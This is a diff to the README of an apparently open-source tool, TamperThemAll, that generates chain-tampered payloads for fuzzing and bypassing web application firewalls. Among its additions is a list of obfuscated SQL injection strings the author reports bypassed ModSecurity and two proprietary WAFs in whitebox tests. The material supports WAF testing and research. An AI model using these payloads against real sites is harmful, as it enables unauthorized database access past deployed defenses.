@@ -2,8 +2,9 @@
 A tampered payload generator to Fuzz Web Application Firewalls for Testing and Bypassing.
 
 ### [*] Know 'How and Why'
-TTA takes in input a string representing your payload, it doen't matter what kind of vulnerability it exploits (SQLi, XSS, CMD Injection etc.), and gives back a payloads set with the input string chain-tampered in all the possible combinations and permutations.
-It's also created an associations file used to find out what chain produced a certain payload, useful function for the post exploitation phase in which you have a set of bypassing payloads and no idea of where they come from.
+This tool aims to facilitate testers in the evaluation process of the goodness of a WAF (for development or bypassing purposes).
+TTA takes in input a string representing your payload, it doesn't matter what kind of vulnerability it exploits (SQLi, XSS, CMD Injection etc.), and gives back a payloads set with the input string chain-tampered in all the possible combinations and permutations created by mixing and chaining all the available tampering scripts in WhatWAF in order to maximize the possibility of a Bypass based on these techniques.
+An associations file is also created as tampering session tracker, it is used to find out what chain produced a certain payload, useful function for the post exploitation phase in which you have a set of bypassing payloads and no idea of where they come from (-search option in the tool).
 Detailed Concept explained in the Medium article:
 https://medium.com/@thesauruss/a-payload-tamperer-for-waf-bypassing-tamperthemall-tta-ef35d43a608c
 
@@ -26,7 +27,7 @@ https://medium.com/@thesauruss/a-payload-tamperer-for-waf-bypassing-tamperthemal
                         search in a .association file what chain produced a
                         certain payload, also print(the 'payload evolution'
                         for further investigation. ex. -s
-                        bypassing/payloadsFile,file.associations
+                        bypassingPayloadsFile,file.associations
   -a, --allTampers      print(available tamper scripts list
 ```
 ### [*] Usage Examples
@@ -43,9 +44,26 @@ https://medium.com/@thesauruss/a-payload-tamperer-for-waf-bypassing-tamperthemal
 This mode is used when you have bypassed the WAF using the produced payloadList and want to find out which chains produced the bypassing payloads. Useful to produce a better PoC or for reasearch purposes about the WAF Normalization Function.
 ![searchMode](https://user-images.githubusercontent.com/25546186/67636050-b8442000-f8cc-11e9-98d6-e451acd4dc06.png)
 
+### [*] Achievements
+When I started coding it I didn’t expect a single bypass, but at the end of the research I managed to bypass 3/3 of the given WAFs (Modsecurity and two proprietary solutions) in many different ways (XSS, SQLi and Command Injections).
+The tests were in Whitebox and the plaintext payload was initially blocked by the WAFs.
+Examples of crafted SQLi bypassing payloads:
+Default SQLi Module
+```
+\u62acroot\uaab3'+%7C%7C+1=1;+--+-
+root'++++++++%7C%7C++++++++1=1;++++++++--++++++++-
+```
+Strict SQLi Module of a proprietary WAF
+```
+roo/**/t\\'%0Cor%091=1;%0A--%0C-
+/*!00000root'+%7C%7C+1=1;+--+-*/
+root'%0Cor%091=1;%09--%0D-
+/*!00000root'+or+1=1;+--+-*/
+```
+At the end of the testing phase the vulnerability with more bypasses found was the SQLi with 32 bypasses for the basic module (23 on a solution and 9 on another) and 3 bypasses for the strict SQLi protection module (on the same WAF).
 
 ### [*] Call for Contributors
-Everyone interested in the development of this tool, please contact me on twitter or linkedin.
+Everyone interested in the development of this tool and technique, please contact me on twitter or linkedin.
 
 **TODO LIST**:
 
@@ -53,6 +71,10 @@ Everyone interested in the development of this tool, please contact me on twitte
 ```from tampers.yourTamperFileName import *```
 
 **-** Add an option to specify which kind of vulnerability you want to exploit with the basePayload in order to create separate tampers lists for each vulnerability (this will reduce the number of payloads and requests sent to the WAF, the less you send the less you annoy)
+
+**-**  Add a payload analysis phase to reduce the tampering script pool. Example: a payload that does not contain spaces should not be tampered with space_to_tab or other scripts related to that char.
+
+**-**  Add a feature to load a list of base payloads from file in order to create a single payloads list for multiple base payloads, resulting bypasses can be separated in the search option by adding the referred base payload in the .associations file for each crafted payload. This should make it easier to test many base payloads at a time, instead of crafting a payloads list for each plain payload.
 
 ## A special thanks to WhatWaf
 It is a tool by EkultekThe used to detect a firewall on a web application, and attempting to detect a bypass.
